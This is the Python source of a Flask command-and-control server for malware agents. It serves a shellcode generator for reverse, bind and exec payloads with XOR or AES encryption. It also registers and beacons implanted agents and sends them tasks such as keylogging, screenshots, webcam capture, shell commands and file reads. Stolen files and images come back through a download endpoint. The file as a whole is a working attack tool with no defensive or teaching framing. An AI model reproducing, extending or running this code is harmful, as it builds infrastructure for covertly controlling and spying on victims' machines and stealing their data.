#!/usr/bin/env python3
import sys
import os
import platform
import time
import json
import base64
import logging
from datetime import datetime
import threading
import requests
from typing import Optional, Dict, List, Any

from flask import Flask, render_template, request, jsonify, redirect, url_for, flash, send_file, Response
from flask_login import LoginManager, login_required, login_user, logout_user, current_user
from werkzeug.security import check_password_hash

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('c2_server.log'),
        logging.StreamHandler()
    ]
)

# Fix: Add correct module path BEFORE importing
MODULES_PATH = os.path.abspath(os.path.join(os.path.dirname(__file__), 'modules'))
if MODULES_PATH not in sys.path:
    sys.path.append(MODULES_PATH)

# Import modules
from modules.shellcode import ShellcodeGenerator
from modules.dns_tunnel.tunnel import DNSTunnel, create_server
from modules.system import get_info
from modules.process import list_processes, kill_process
from modules.surveillance import take_screenshot, capture_webcam, start_keylogger, stop_keylogger
from modules.files import list_directory, get_file_info, read_file, write_file, delete_file
from modules.shell import execute
from models import User, users

# Initialize Flask app
app = Flask(__name__)
app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', os.urandom(24).hex())

# Initialize login manager
login_manager = LoginManager()
login_manager.init_app(app)
login_manager.login_view = 'login'

@login_manager.user_loader
def load_user(user_id):
    return User.get(user_id)

# Initialize components
shellcode_gen = ShellcodeGenerator()
dns_tunnel = create_server("example.com")

# Data stores
agents = {}
tasks = {}
results = {}

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        if username in users and check_password_hash(users[username], password):
            user = User(username)
            login_user(user)
            return redirect(url_for('index'))
        
        flash('Invalid username or password')
    return render_template('login.html')

@app.route('/logout')
@login_required
def logout():
    logout_user()
    return redirect(url_for('login'))

@app.route('/')
@login_required
def index():
    return render_template('index.html')

@app.route('/shellcode')
@login_required
def shellcode():
    return render_template('shellcode.html')

@app.route('/control')
@login_required
def control():
    return render_template('control.html')

@app.route('/api/generate_shellcode', methods=['POST'])
def generate_shellcode():
    try:
        data = request.get_json()
        shellcode_type = data.get('type')
        platform = data.get('platform', 'windows')
        encoding = data.get('encoding', 'base64')
        encryption = data.get('encryption', 'none')
        key = data.get('key', '')
        payload = data.get('payload')
        custom_payload = data.get('custom_payload', '')
        shellcode = None

        # Use custom payload if selected
        if payload == 'custom' and custom_payload:
            msf_payload = custom_payload
        else:
            msf_payload = payload

        if shellcode_type == 'reverse':
            host = data.get('host')
            port = int(data.get('port', 0))
            if not host or not port:
                return jsonify({'success': False, 'error': 'Host and port are required'}), 400
            shellcode = shellcode_gen.generate_reverse_shell(host, port, platform, msf_payload)

        elif shellcode_type == 'bind':
            port = int(data.get('port', 0))
            if not port:
                return jsonify({'success': False, 'error': 'Port is required'}), 400
            shellcode = shellcode_gen.generate_bind_shell(port, platform, msf_payload)

        elif shellcode_type == 'exec':
            command = data.get('command')
            if not command:
                return jsonify({'success': False, 'error': 'Command is required'}), 400
            shellcode = shellcode_gen.generate_exec(command, platform)

        else:
            return jsonify({'success': False, 'error': 'Invalid shellcode type specified'}), 400

        if shellcode is None:
            return jsonify({'success': False, 'error': 'Shellcode generation failed.'}), 500

        if encryption == 'xor':
            shellcode = shellcode_gen.xor_encrypt(shellcode, key or "defaultxor")
        elif encryption == 'aes':
            shellcode = shellcode_gen.aes_encrypt(shellcode, key or "defaultaes")

        encoded = shellcode_gen.encode_shellcode(shellcode, encoding)
        if encoded is None:
            return jsonify({'success': False, 'error': 'Encoding failed'}), 500

        return jsonify({'success': True, 'shellcode': encoded.decode() if isinstance(encoded, bytes) else encoded})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/agents', methods=['GET'])
def list_agents():
    return jsonify(list(agents.values()))

@app.route('/api/agents/register', methods=['POST'])
def register_agent():
    try:
        wrapper = request.get_json()
        encoded_data = wrapper.get('data')
        if not encoded_data:
            return jsonify({'status': 'error', 'message': 'Missing data'}), 400

        decoded_json = base64.b64decode(encoded_data).decode()
        data = json.loads(decoded_json)
        agent_id = data.get('agent_id')

        if agent_id:
            if agent_id in agents:
                agents[agent_id].update(data)
                agents[agent_id]['last_seen'] = datetime.now().isoformat()
            else:
                agents[agent_id] = data
                agents[agent_id]['last_seen'] = datetime.now().isoformat()
                agents[agent_id]['results'] = {}

            logging.info(f"Registered agent: {agent_id}")
            return jsonify({'status': 'success'})

        return jsonify({'status': 'error', 'message': 'Missing agent_id'}), 400

    except Exception as e:
        logging.error(f"Registration error: {str(e)}")
        return jsonify({'status': 'error'}), 500

@app.route('/api/agents/beacon', methods=['POST'])
def agent_beacon():
    try:
        wrapper = request.get_json()
        encoded_data = wrapper.get('data')
        if not encoded_data:
            return jsonify({'status': 'error', 'message': 'Missing data'}), 400

        decoded_json = base64.b64decode(encoded_data).decode()
        data = json.loads(decoded_json)
        agent_id = data.get('agent_id')
        timestamp = datetime.now().isoformat()

        if agent_id:
            if agent_id in agents:
                agents[agent_id]['last_seen'] = timestamp
            else:
                agents[agent_id] = {
                    'agent_id': agent_id,
                    'system_info': data.get('system_info'),
                    'status': data.get('status'),
                    'last_seen': timestamp,
                    'results': {}
                }

            logging.info(f"Beacon received from {agent_id}")
            return jsonify({'status': 'ok', 'message': 'Beacon received'})

        return jsonify({'status': 'error', 'message': 'Missing agent_id'}), 400

    except Exception as e:
        logging.error(f"Beacon error: {str(e)}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/tasks', methods=['POST'])
@login_required
def create_task():
    try:
        data = request.get_json()
        agent_id = data.get('agent_id')
        module = data.get('module')
        params = data.get('params', {})

        if not agent_id or not module:
            return jsonify({
                'status': 'error',
                'message': 'Missing required fields'
            }), 400

        # Create task with the correct format for the agent
        task_id = f"task_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        
        # Convert module path to type (e.g., 'modules.system.get_info' -> 'system_info')
        task_type = module.replace('modules.', '').replace('.', '_')
        
        task = {
            'task_id': task_id,
            'type': task_type,
            'data': params,
            'status': 'pending',
            'timestamp': datetime.now().isoformat()
        }

        # Add task to queue
        if agent_id not in tasks:
            tasks[agent_id] = []
        tasks[agent_id].append(task)

        logging.info(f"Task {task_id} created for agent {agent_id}: {task_type}")
        logging.debug(f"Task details: {json.dumps(task, indent=2)}")
        return jsonify({
            'status': 'success',
            'task_id': task_id
        })

    except Exception as e:
        logging.error(f"Error creating task: {str(e)}")
        return jsonify({
            'status': 'error',
            'message': str(e)
        }), 500

@app.route('/api/tasks/<agent_id>', methods=['GET'])
def get_tasks(agent_id):
    try:
        if agent_id not in agents:
            logging.warning(f"Unknown agent tried to get tasks: {agent_id}")
            return jsonify({
                'status': 'error',
                'message': 'Unknown agent'
            }), 404

        # Update agent's last seen timestamp
        agents[agent_id]['last_seen'] = datetime.now().isoformat()

        # Get pending tasks
        agent_tasks = tasks.get(agent_id, [])
        if not agent_tasks:
            logging.debug(f"No pending tasks for agent {agent_id}")
            return jsonify([])

        # Get the next task
        next_task = agent_tasks.pop(0)
        logging.info(f"Sending task {next_task['task_id']} to agent {agent_id}")
        logging.debug(f"Task details: {json.dumps(next_task, indent=2)}")

        # Encode task data
        encoded_data = base64.b64encode(json.dumps(next_task).encode()).decode()
        return jsonify({'data': encoded_data})

    except Exception as e:
        logging.error(f"Error getting tasks for agent {agent_id}: {str(e)}")
        return jsonify({
            'status': 'error',
            'message': str(e)
        }), 500

@app.route('/api/results', methods=['POST'])
def receive_result():
    try:
        wrapper = request.get_json()
        encoded_data = wrapper.get('data')
        if not encoded_data:
            logging.warning("Received result without data")
            return jsonify({
                'status': 'error',
                'message': 'Missing data'
            }), 400

        # Accept both base64 string and dict
        if isinstance(encoded_data, dict):
            data = encoded_data
        else:
            try:
                decoded_json = base64.b64decode(encoded_data).decode()
                data = json.loads(decoded_json)
            except Exception as e:
                logging.error(f"Error decoding result data: {str(e)}")
                return jsonify({
                    'status': 'error',
                    'message': 'Invalid data format'
                }), 400

        agent_id = data.get('agent_id')
        task_id = data.get('task_id')
        result = data.get('result')
        timestamp = data.get('timestamp', datetime.now().isoformat())

        if not agent_id or not task_id:
            logging.warning(f"Received result with missing fields: agent_id={agent_id}, task_id={task_id}")
            return jsonify({
                'status': 'error',
                'message': 'Missing required fields'
            }), 400

        # Validate and sanitize result data
        if isinstance(result, dict):
            # Handle image data
            if 'data' in result and result.get('format') in ['png', 'jpg', 'jpeg', 'gif', 'bmp']:
                try:
                    # Validate base64 image data
                    base64.b64decode(result['data'])
                except Exception as e:
                    logging.error(f"Invalid image data in result: {str(e)}")
                    result = {'error': 'Invalid image data'}
            
            # Handle file data
            elif 'data' in result and result.get('path'):
                try:
                    # Validate base64 file data
                    base64.b64decode(result['data'])
                except Exception as e:
                    logging.error(f"Invalid file data in result: {str(e)}")
                    result = {'error': 'Invalid file data'}

        logging.info(f"Processing result from agent {agent_id} for task {task_id}")
        logging.debug(f"Result data: {json.dumps(result, indent=2)}")

        # Store result with metadata
        if agent_id not in results:
            results[agent_id] = {}
        results[agent_id][task_id] = {
            'result': result,
            'timestamp': timestamp,
            'processed': False,
            'type': data.get('type', ''),
            'status': data.get('status', 'success'),
            'error': data.get('error', None)
        }

        # Update agent's results
        if agent_id in agents:
            if 'results' not in agents[agent_id]:
                agents[agent_id]['results'] = {}
            agents[agent_id]['results'][task_id] = {
                'result': result,
                'timestamp': timestamp,
                'type': data.get('type', ''),
                'status': data.get('status', 'success')
            }

        logging.info(f"Successfully stored result from agent {agent_id} for task {task_id}")
        return jsonify({'status': 'success'})

    except Exception as e:
        logging.error(f"Error processing result: {str(e)}")
        return jsonify({
            'status': 'error',
            'message': str(e)
        }), 500

@app.route('/api/results/<agent_id>', methods=['GET'])
def get_results_for_agent(agent_id):
    """Get all results for a specific agent"""
    agent_results = []
    if agent_id in results:
        for task_id, entry in results[agent_id].items():
            agent_results.append({
                'task_id': task_id,
                'result': entry.get('result'),
                'timestamp': entry.get('timestamp'),
                'status': 'success',
                'type': entry.get('result', {}).get('type', '')
            })
    return jsonify({'status': 'success', 'results': agent_results})

@app.route('/api/results/download/<task_id>', methods=['GET'])
def download_result(task_id):
    import base64, os, json, mimetypes
    for agent_id, agent_results in results.items():
        if task_id in agent_results:
            entry = agent_results[task_id]
            result = entry.get('result', {})
            try:
                # Handle image download
                if isinstance(result, dict):
                    # Handle file result where result['data'] is a dict (agent file exfil)
                    if 'data' in result and isinstance(result['data'], dict) and 'data' in result['data']:
                        file_data = base64.b64decode(result['data']['data'])
                        filename = result['data'].get('filename', f'{task_id}.bin')
                        mimetype, _ = mimetypes.guess_type(filename)
                        if not mimetype:
                            mimetype = 'application/octet-stream'
                        return Response(file_data, mimetype=mimetype, headers={
                            'Content-Disposition': f'attachment;filename={os.path.basename(filename)}'
                        })
                    if 'data' in result and result.get('format') in ['png', 'jpg', 'jpeg', 'gif', 'bmp']:
                        file_data = base64.b64decode(result['data'])
                        file_format = result.get('format', 'bin')
                        filename = result.get('filename') or f'{task_id}.{file_format}'
                        mimetype = f'image/{file_format.lower()}'
                        return Response(file_data, mimetype=mimetype, headers={
                            'Content-Disposition': f'attachment;filename={os.path.basename(filename)}'
                        })
                    # Handle file download (legacy: result['data'] is base64, result['path'] is filename)
                    if 'data' in result and result.get('path'):
                        file_data = base64.b64decode(result['data'])
                        filename = os.path.basename(result['path'])
                        mimetype, _ = mimetypes.guess_type(filename)
                        if not mimetype:
                            mimetype = 'application/octet-stream'
                        return Response(file_data, mimetype=mimetype, headers={
                            'Content-Disposition': f'attachment;filename={filename}'
                        })
                    # Handle dictionary/JSON data
                    content = json.dumps(result, indent=2)
                    mimetype = 'application/json'
                    filename = f'{task_id}.json'
                    return Response(content, mimetype=mimetype, headers={
                        'Content-Disposition': f'attachment;filename={filename}'
                    })
                # Handle string data
                elif isinstance(result, str):
                    content = result
                    mimetype = 'text/plain'
                    filename = f'{task_id}.txt'
                    return Response(content, mimetype=mimetype, headers={
                        'Content-Disposition': f'attachment;filename={filename}'
                    })
                # Handle bytes data
                elif isinstance(result, bytes):
                    content = result
                    mimetype = 'application/octet-stream'
                    filename = f'{task_id}.bin'
                    return Response(content, mimetype=mimetype, headers={
                        'Content-Disposition': f'attachment;filename={filename}'
                    })
                # Fallback for any other type
                else:
                    content = str(result)
                    mimetype = 'text/plain'
                    filename = f'{task_id}.txt'
                    return Response(content, mimetype=mimetype, headers={
                        'Content-Disposition': f'attachment;filename={filename}'
                    })
            except Exception as e:
                logging.error(f"Error processing download for task {task_id}: {str(e)}")
                return str(e), 500
    return 'Result not found', 404

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5001)
